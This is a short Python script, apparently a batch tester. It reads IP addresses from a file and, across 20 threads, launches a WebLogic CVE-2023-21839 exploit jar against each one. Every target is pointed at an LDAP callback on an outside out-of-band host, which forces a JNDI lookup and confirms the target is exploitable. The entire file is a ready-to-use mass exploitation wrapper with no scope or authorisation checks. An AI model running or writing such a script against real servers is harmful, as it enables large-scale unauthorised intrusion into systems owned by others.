import  subprocess

def poc(ip):
    command = [
        r"C:\Program Files\Java\jdk1.8.0_321\bin\java.exe",
        "-jar",
        r"d:\exeTools\weblogic\Weblogic-CVE-2023-21839.jar",
        f"{ip}",
        "ldap://abc.rjnt2n.ceye.io"
    ]

    # 运行命令并捕获输出
    # try:
    result = subprocess.run(command, capture_output=True, text=True)
    if "timed out" in result.stderr:
        print(ip,"超时")
    else:
        print(f"Standard Output:\n{ip}", result.stdout)
    # except Exception as e:
    #     # print("An error occurred while running the command:", e)
    #     pass


from concurrent.futures import ThreadPoolExecutor
# 批量检测
with open('ip.txt', 'r') as file:
    ips = [u.strip().split('://')[1] for u in file.readlines()]
with ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(poc, ips)